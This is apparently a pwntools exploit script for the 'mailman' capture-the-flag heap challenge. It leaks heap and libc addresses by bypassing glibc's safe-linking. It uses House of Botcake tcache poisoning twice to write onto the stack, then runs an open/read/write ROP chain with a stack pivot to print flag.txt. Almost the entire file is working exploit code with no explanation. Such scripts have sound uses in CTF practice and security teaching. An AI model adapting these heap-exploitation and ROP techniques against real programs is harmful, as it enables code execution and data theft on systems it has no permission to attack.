#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("mailman.chal.imaginaryctf.org", 1337)

    return r


r = conn()

if(args.GDB):
    gdb.attach(r, '''
        init-pwndbg
        dprint *(void *)&main+0x1e3, "malloc(%d)\\n", (void *)$rdi
        dprint *(void *)&main+0x1e8, "malloc: %p\\n", (void *)$rax
        dprint *(void *)&main+0x26c, "free(%p)\\n", (void *)$rdi
    ''')

# breakrva 0x158d
# breakrva 0x1504
        
def alloc(index, size, content=b''):
    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b"idx: ", str(index).encode())
    r.sendlineafter(b"size: ", str(size).encode())
    r.sendlineafter(b"content: ", content)
    return index


def free(index):
    r.sendlineafter(b"> ", b"2")
    r.sendlineafter(b"idx: ", str(index).encode())
    
def read(index):
    r.sendlineafter(b"> ", b"3")
    r.sendlineafter(b"idx: ", str(index).encode())
    return u64(r.recvline(keepends=False).ljust(8, b"\x00"))
    # good luck pwning :)

def decrypt(cipher):
    key = 0
    plain=0

    for i in range(1, 6):
        bits = 64-12*i
        if(bits < 0):
            bits = 0
        plain = ((cipher ^ key) >> bits) << bits
        key = plain >> 12
    
    return plain
    

alloc(0, 0x30)
alloc(1, 0x30)

free(0)
free(1)

leak = read(1)

heapLeak = decrypt(leak) - 0x2310
key = (heapLeak >> 12) + 3

info("[HEAP LEAK]: " + hex(heapLeak))
info("[KEY]: " + hex(key))


# Leak libc base
alloc(0, 0x600)

# Avoid merging with top chunk
for i in range(5):
    alloc(1, 0x80)

free(0)

libc.address = read(0) - (libc.sym["main_arena"]+96)

alloc(0, 0x600)

info("[LIBC BASE]: " + str(hex(libc.address)))


# house of botcake parte 1

for i in range(7):
    alloc(i, 0x100)

prev = alloc(7, 0x100)
a = alloc(8, 0x100)


alloc(9, 0x80)

for i in range(7):
    free(i)

free(a)

free(prev)

alloc(10, 0x100)

free(a)

padding = cyclic(0x108)

alloc(1, 0x200, padding + p64(0x111) + p64(libc.sym["environ"] ^ key))

b = alloc(2, 0x100)

a = alloc(3, 0x100)

free(b)

environ = read(b) ^ key ^ (libc.sym["environ"] >> 12)

info("[ENVIRON]: " + hex(environ))


# house of botcake parte 2

for i in range(7):
    alloc(i, 0x120)

prev = alloc(7, 0x120)
a = alloc(8, 0x120)


alloc(9, 0x80)

for i in range(7):
    free(i)

free(a)

free(prev)

alloc(10, 0x120)

free(a)

padding = cyclic(0x128)

alloc(1, 0x200, padding + p64(0x131) + p64((environ - 0x188) ^ key))

rop = ROP([libc])

rop.read(0, environ, 0x10)
rop.rax = 2
rop.call(rop.find_gadget(["syscall", "ret"]), [environ, 0])
rop.read(3, environ, 0x50)
rop.write(1, environ, 0x50)


alloc(2, 0x120)

# memorize rop chain
alloc(7, 0x600, rop.chain())


address = heapLeak + 0x3f90

rop = ROP([libc])
rop.raw(rop.find_gadget(["pop rsp", "ret"]))
rop.raw(address)


# stack pivoting
alloc(3, 0x120, b"\x00" * 0x28 + rop.chain())

r.send(b"flag.txt\x00")

r.interactive()

